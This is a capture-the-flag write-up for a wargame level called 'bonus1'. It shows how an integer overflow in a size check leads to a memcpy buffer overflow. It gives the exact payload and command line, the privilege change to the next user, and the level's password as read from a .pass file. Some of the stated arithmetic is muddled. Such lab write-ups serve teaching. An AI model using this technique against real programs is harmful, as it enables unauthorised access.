### Download binary
``scp -P4242 bonus1@192.168.31.170:/home/bonus1/bonus1 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

We see that there's a buffer overflow on the memcpy, because we can control the size of the copy. This size is stored in argv[1]. The only problem is that we need to overflow a buffer of size 40, but we also have to pass a condition that ask argv[1] to be less than 10. After that argv[1] is multiplied by 4 and that is the size of our memcpy().

We will achieve this by doing a int overflow. Because the variable that hold argv[1] is an unsigned int, the int overflow is predictable.

----

### Building the payload

We will want something like this :

**Our size that buffer overflow into 44, the correct integer that we have to put in the var**

The second part is rather simple, it is hardcoded. The value required is 57 4f 4c 46, in little endian this will be reversed so 46 4c 4f 57. In ascii this can be tanslated to 'FLOW'.

For the first part, we need to divide the min integer - 44 by 4. Because we need to overflow the min integer after the multiplication and 44 is the size of the buffer we want to overflow + 4 bits, because we want to write FLOW. (4294967295 - 44) / 4 = -1073741812.75

Our final payload is :
``-1073741812 $(python -c "print('\x90' * 40 + 'FLOW')")``

----

#### Getting the flag

``./bonus1 -1073741812 $(python -c "print('\x90' * 40 + 'FLOW')")``
>

``whoami``
>bonus2

``cat /home/user/bonus2/.pass``
>579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
